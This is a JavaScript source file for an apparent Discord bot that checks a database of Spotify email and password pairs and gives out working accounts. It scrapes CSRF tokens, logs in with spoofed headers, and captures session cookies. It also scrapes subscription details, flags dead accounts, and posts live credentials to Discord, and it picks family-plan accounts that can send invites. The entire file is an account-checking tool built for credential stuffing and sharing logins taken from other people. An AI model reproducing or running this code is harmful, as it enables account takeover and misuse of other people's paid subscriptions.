var request = require("request");
const Discord = require("discord.js");

function Account(email, password, country, subscription, renovationDate) {
    this.email = email;
    this.password = password;
    this.country = country;
    this.subscription = subscription;
    this.renovationDate = renovationDate;
}

function transformdate(renovationdate) {
    renovationdate = renovationdate.split("/");
    var year = "20" + renovationdate[2];
    if (renovationdate[0].length == 1) {
        var month = "0" + renovationdate[0];
    } else {
        var month = renovationdate[0];
    }
    if (renovationdate[1].length == 1) {
        var day = "0" + renovationdate[1];
    } else {
        var day = renovationdate[1];
    }
    var result = year + "-" + month + "-" + day;
    return result;
}

Account.prototype.getToken = function () {
    return new Promise(resolve => {
        var dataString = "https://accounts.spotify.com/it-IT/login";
        var headers = {
            "Accept-Encoding": "gzip, deflate, sdch, br",
            "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Cache-Control": "max-age=0",
            Connection: "keep-alive"
        };

        var options = {
            url: dataString,
            method: "GET",
            headers: headers,
            timeout: 1500,
            gzip: true
        };

        request(options, (err, res, body) => {
            if (err || !res.headers["set-cookie"][1] || !body) {
                Account.prototype.getToken();
            } else {
                var cookies = res.headers["set-cookie"][1];
                cookies = cookies.split(";");
                var token = cookies[0];
                token = token.split("csrf_token=");
                token = token[1];
                resolve(token);
            }
        });
    });
};

Account.prototype.login = function (email, password, token) {
    return new Promise(resolve => {
        var dataString =
            "remember=true&username=" +
            email +
            "&password=" +
            password +
            "&csrf_token=" +
            token;
        var bon = "MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx";
        var cookie =
            "sp_t=; sp_new=1; __bon=" +
            bon +
            "; _gat=1; __tdev=VV4fjDj7; __tvis=BGWgw2Xk; spot=; csrf_token=" +
            token +
            "; remember=" +
            email;

        var headers = {
            Origin: "https://accounts.spotify.com",
            "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
            Pragma: "no-cache",
            Accept: "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            Referer: "https://accounts.spotify.com/it-IT/login",
            Cookie: cookie,
            Connection: "keep-alive"
        };

        var options = {
            uri: "https://accounts.spotify.com/api/login",
            method: "POST",
            headers: headers,
            body: dataString,
            gzip: true
        };

        request(options, (err, res, body) => {
            var respuestaspot;
            var positive = '"displayName":"';
            var negative = '"error":"errorInvalidCredentials"';
            if (err || (!body.includes(positive) && !body.includes(negative))) {
                Account.prototype.login(email, password, token);
            } else {
                positive = body.includes(positive);
                negative = body.includes(negative);
                if (positive == true) {
                    var cookies = res.headers["set-cookie"][1];
                    cookies = cookies.split("sp_dc=");
                    cookies = cookies[1];
                    cookies = cookies.split(";");
                    var sp_dc = cookies[0];
                    respuestaspot = sp_dc;
                } else if (negative == true) {
                    respuestaspot = "Bad";
                } else {
                    respuestaspot = "Error";
                }
            }
            resolve(respuestaspot);
        });
    });
};

Account.prototype.getAcc = function (sp_dc) {
    return new Promise(resolve => {
        var dataString = "https://www.spotify.com/us/account/overview/";
        var headers = {
            "Accept-Encoding": "gzip, deflate, sdch, br",
            "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Cache-Control": "max-age=0",
            Connection: "keep-alive",
            Cookie: "sp_ftv=1; sp_landing=www.spotify.com^%^2F; sp_landing_15d=www.spotify.com^%^2F; sp_landing_30d=www.spotify.com^%^2F; sp_new=1; sp_ab=; pxt=; justRegistered=null; _gat=1; sp_dc=" +
                sp_dc
        };

        var options = {
            url: dataString,
            method: "GET",
            headers: headers,
            gzip: true
        };

        request(options, (err, res, body) => {
            if (body) {
                var first = body.split('{"title":"Your plan","plan":{"name":"');
                first = first[1];
                if (!first) {
                    Account.prototype.getAcc(sp_dc);
                } else {
                    var tipo = first.split('"');
                    tipo = tipo[0];
                    var familymember = body.includes("member of a Family");
                    if (tipo == "Spotify Premium Family" && familymember == true) {
                        tipo = "member of Family";
                    } else if (tipo == "Spotify Premium Family") {
                        tipo = "Family Owner";
                    }
                    first = first.split('{"label":"Country","value":"');
                    first = first[1];
                    var pais = first.split('"');
                    pais = pais[0];
                    var fecharenovacion = body.split('<b class=\\"recurring-date\\">');
                    fecharenovacion = fecharenovacion[1];
                    if (fecharenovacion) {
                        fecharenovacion = fecharenovacion.split("<\\");
                        fecharenovacion = fecharenovacion[0];
                        fecharenovacion = fecharenovacion.replace("\\", "");
                        fecharenovacion = fecharenovacion.replace("\\", "");
                        fecharenovacion = transformdate(fecharenovacion);
                    } else {
                        fecharenovacion = "External";
                    }
                    var respuesta = {
                        type: tipo,
                        country: pais,
                        renovationdate: fecharenovacion
                    };
                    resolve(respuesta);
                }
            } else {
                Account.prototype.getAcc(sp_dc);
            }
        });
    });
};

var buildAccEmbed = function(details) {
    var description = "";
    description+= `Email: ${details.email}\n`;
    description+= `Password: ${details.password}\n`;
    description+= `Country: ${details.country}\n`;
    description+= `Renovation Date: ${details.renovationdate}\n`;
    description+= `Subscription: ${details.type}`;
    var embed = new Discord.RichEmbed()
	.setColor('#36D844')
	.setTitle('Spotify Account')
	.setDescription(description)
	.setFooter('Bot done by EduAir');
    return embed;
}

Account.prototype.getAccount = async function () {
    var account = await Account.prototype.getAccountRandom();
    var email = account.email;
    var password = account.password;
    var token = await Account.prototype.getToken();
    var sp_dc = await Account.prototype.login(email, password, token);
    if (sp_dc == "Bad") {
        await Account.prototype.updateStatus(email, false);
        Account.prototype.getAccount();
    } else {
        var accountDetails = await Account.prototype.getAcc(sp_dc);
        accountDetails.email = email;
        accountDetails.password = password;
        if (accountDetails.type == "Free Spotify") {
            await Account.prototype.updateStatus(email, false);
            Account.prototype.getAccount();
        }
        return buildAccEmbed(accountDetails);
    }
};

Account.prototype.checkAccount = async function (cb) {
    var email = this.email;
    var password = this.password;
    var token = await Account.prototype.getToken();
    var sp_dc = await Account.prototype.login(email, password, token);
    if (sp_dc == "Bad") {
        await Account.prototype.updateStatus(email, false);
        cb('Bad');
    } else {
        var accountDetails = await Account.prototype.getAcc(sp_dc);
        accountDetails.email = email;
        accountDetails.password = password;
        if (accountDetails.type == "Free Spotify") {
            await Account.prototype.updateStatus(email, false);
        }
        cb(accountDetails);
    }
};

Account.prototype.insertAccount = async function () {
    return new Promise(resolve => {
        var query = {
                email: this.email
            },
            update = {
                password: this.password,
                country: this.country,
                subscription: this.subscription,
                renovationDate: this.renovationDate,
                status: true
            },
            options = {
                upsert: true,
                new: true,
                setDefaultsOnInsert: true,
                useFindAndModify: false
            };

        AccountModel.findOneAndUpdate(query, update, options, function (
            error,
            result
        ) {
            console.log("QUERY::", query);
            console.log("UPDATE::", update);
            console.log("RESULT::", result);
            if (error) {
                resolve("Fail");
            } else if (result) {
                resolve("Success");
            }
        });
    });
};

Account.prototype.updateStatus = async function (email, status) {
    return new Promise(resolve => {
        var query = {
                email: email
            },
            update = {
                status: status
            },
            options = {
                upsert: true,
                new: true,
                setDefaultsOnInsert: true,
                useFindAndModify: false
            };
        AccountModel.findOneAndUpdate(query, update, options, function (
            error,
            result
        ) {
            console.log("QUERY::", query);
            console.log("UPDATE::", update);
            if (error) {
                resolve("Fail");
            } else if (result) {
                resolve("Success");
            }
        });
    });
};

Account.prototype.getAccountRandom = async function () {
    return new Promise(resolve => {
        // Get the count of all users
        AccountModel.countDocuments({
            status: {
                $ne: false
            }
        }).exec(function (err, count) {
            // Get a random entry
            var random = Math.floor(Math.random() * count);

            // Again query all users but only fetch one offset by our random #
            AccountModel.findOne({
                    status: {
                        $ne: false
                    }
                })
                .skip(random)
                .exec(function (err, result) {
                    // Tada! random user
                    //result.count = count;
                    resolve(result);
                });
        });
    });
};

Account.prototype.stock = async function () {
    return new Promise(resolve => {
        // Get the count of all users
        AccountModel.countDocuments({
            status: {
                $ne: false
            }
        }).exec(function (err, count) {
            resolve(count);
        });
    });
};

Account.prototype.invite = async function (cuenta) {
    return new Promise(resolve => {
        query = {
            $and: [{
                address: {
                    $exists: true
                }
            }, {
                canInvite: true
            }]
        };
        if (cuenta.pais) {
            query = {
                $and: [{
                        address: {
                            $exists: true
                        }
                    },
                    {
                        canInvite: true
                    },
                    {
                        country: cuenta.pais
                    }
                ]
            };
        }
        // Get the count of all users
        AccountModel.countDocuments(query).exec(function (err, count) {
            // Get a random entry
            var random = Math.floor(Math.random() * count);
            console.log(random);
            console.log(count);
            if (count == 0) {
                resolve("No Accounts");
                return false;
            }
            // Again query all users but only fetch one offset by our random #
            AccountModel.findOne(query)
                .skip(random)
                .exec(function (err, result) {
                    // Tada! random user
                    console.log(result);
                    //result.count = count;
                    resolve(result);
                });
        }, query);
    });
};

module.exports = Account;